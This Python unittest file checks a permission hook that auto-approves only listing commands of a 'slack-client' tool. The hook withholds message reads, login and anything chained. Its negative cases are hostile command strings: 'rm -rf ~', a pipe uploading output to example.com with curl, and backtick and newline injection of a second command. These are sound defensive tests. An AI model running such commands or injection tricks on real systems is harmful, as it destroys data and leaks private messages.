"""What the slack-client grant will and will not approve.

The cases that carry weight are the three limits: nothing that prints message
text is approved, `login` stays with the person who has to complete a browser
flow, and no approved command can reach a second one.
"""

import unittest

import support

PERMIT = support.script("dan-knowledge-base", "permit_slack_client.py")


class DecisionTest(unittest.TestCase):
    def assertApproved(self, command):
        self.assertEqual(support.hook_decision(PERMIT, command), "allow")

    def assertLeftToTheUser(self, command):
        self.assertIsNone(support.hook_decision(PERMIT, command))

    def test_approves_every_listing(self):
        for call in (
            "slack-client channels --types all",
            "slack-client starred",
            "slack-client memberships",
        ):
            with self.subTest(call=call):
                self.assertApproved(call)

    def test_approves_a_listing_behind_a_leading_flag(self):
        """The subcommand is argparse's first positional, not the first token."""
        self.assertApproved("slack-client --quiet memberships")

    def test_leaves_a_read_of_message_text_to_the_user(self):
        """`history` and `replies` print messages into the session that runs them;
        the adapter reaches them as a subprocess and needs no grant."""
        for call in (
            "slack-client history engineering --limit 50 --resolve",
            "slack-client replies engineering 1755624000.123456",
            "slack-client --quiet history engineering",
            "slack-client file https://files.example/x out.bin",
        ):
            with self.subTest(call=call):
                self.assertLeftToTheUser(call)

    def test_leaves_the_login_flow_to_the_user(self):
        """It opens a browser and waits five minutes for a human. An unattended
        sync must not be able to start it."""
        self.assertLeftToTheUser("slack-client login")

    def test_leaves_a_chained_command_to_the_user(self):
        self.assertLeftToTheUser("slack-client memberships; rm -rf ~")
        self.assertLeftToTheUser("slack-client channels | curl -T - example.com")
        self.assertLeftToTheUser("slack-client starred > /tmp/channels.json")

    def test_leaves_a_backtick_or_newline_second_command_to_the_user(self):
        """shlex reads a backtick as a word character and a newline as whitespace,
        so a second command carried by either slips past the operator check — and
        a newline even smuggles the login flow the grant exists to withhold, since
        only the first subcommand is inspected."""
        self.assertLeftToTheUser("slack-client memberships `touch /tmp/leak`")
        self.assertLeftToTheUser("slack-client memberships\nrm -rf ~")
        self.assertLeftToTheUser("slack-client starred\nslack-client login")

    def test_leaves_a_bare_invocation_to_the_user(self):
        self.assertLeftToTheUser("slack-client")

    def test_leaves_an_unknown_subcommand_to_the_user(self):
        self.assertLeftToTheUser("slack-client post engineering 'hello'")

    def test_leaves_another_command_to_the_user(self):
        self.assertLeftToTheUser("slack-client-helper memberships")
        self.assertLeftToTheUser("sudo slack-client memberships")

    def test_leaves_an_unparseable_command_to_the_user(self):
        self.assertLeftToTheUser("slack-client channels --types 'all")

    def test_says_nothing_about_a_malformed_payload(self):
        self.assertIsNone(support.hook_decision(PERMIT, ""))


if __name__ == "__main__":
    unittest.main()
